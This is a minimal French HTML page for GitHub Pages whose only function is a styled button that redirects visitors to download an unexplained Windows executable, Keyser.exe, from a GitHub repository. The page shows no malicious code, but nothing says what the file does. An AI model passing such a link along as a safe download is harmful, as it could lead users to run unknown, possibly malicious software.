<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mon site GitHub Pages</title>
    <!-- Lien vers le CDN Bootstrap pour un design moderne -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <style>
        /* Personnalisation du body */
        body {
            background-color: #f0f8ff; /* Couleur de fond légère */
            font-family: Arial, sans-serif; /* Police simple */
            margin: 0;
            padding: 0;
        }

        /* Zone principale */
        .main-content {
            text-align: center;
            padding: 50px 0;
        }

        /* Bouton de téléchargement stylisé */
        .btn-download {
            background-color: #00bfff; /* Bleu clair */
            border: none;
            color: black;
            font-size: 20px;
            padding: 15px 30px;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s;
        }

        .btn-download:hover {
            background-color: #009acd; /* Bleu foncé au survol */
        }

        /* Titre principal */
        h1 {
            color: #333;
            font-size: 3rem;
            margin-bottom: 20px;
        }

        /* Texte secondaire */
        p.lead {
            font-size: 1.25rem;
            color: #555;
        }
    </style>
</head>
<body>

    <div class="container main-content">
        <h1 class="display-4">Bienvenue sur mon site GitHub Pages !</h1>
        <p class="lead">Cliquez ci-dessous pour télécharger le fichier</p>
        <!-- Bouton de téléchargement -->
        <button class="btn-download" onclick="downloadFile()">Télécharger</button>
    </div>

    <!-- Script pour le téléchargement -->
    <script>
        function downloadFile() {
            // Remplace par l'URL de ton fichier sur GitHub
            window.location.href = 'https://github.com/voduseuroee/oemec-en-3D/blob/main/Keyser.exe';
        }
    </script>

</body>
</html>
